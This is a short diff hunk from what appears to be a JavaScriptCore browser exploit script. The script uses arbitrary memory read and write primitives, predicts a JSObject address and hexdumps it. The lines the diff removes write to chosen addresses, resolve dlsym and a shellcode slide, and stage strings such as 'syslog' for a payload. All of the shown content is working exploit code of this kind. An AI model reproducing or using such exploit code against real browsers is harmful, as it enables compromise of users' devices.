@@ -30,21 +30,11 @@ function main() {
 	log("*(uint16_t*)base = 0x" + read_u16(base).toString(16));
 	log("*(uint32_t*)base = 0x" + read_u32(base).toString(16));
 
-	write_u32(0x144444, 0x69691337);
-
-	child.a = parent;
-	
 	predicted_jsobject_addy = 0x422200;
 	buf = read_buf(predicted_jsobject_addy, 0x200);
 
 	log("hexdump of predicted jsobject loc:");
 	log(hexdump(buf, 8, 2, predicted_jsobject_addy, 8, "0x"));
-
-	var dlsym_addy = read_u32(0x1a0000 + 24 + slid);
-	var shc_slide = read_u32(0x1a0000 + 20 + slid);
-	write_str(0x148000, "get rekt from jsc %d (slide=%x)\n\0");
-	write_str(0x149000, "syslog\0");
-	write_str(0x14a000, "sleep\0");
 
 	var i = 0;
 	while (true) {
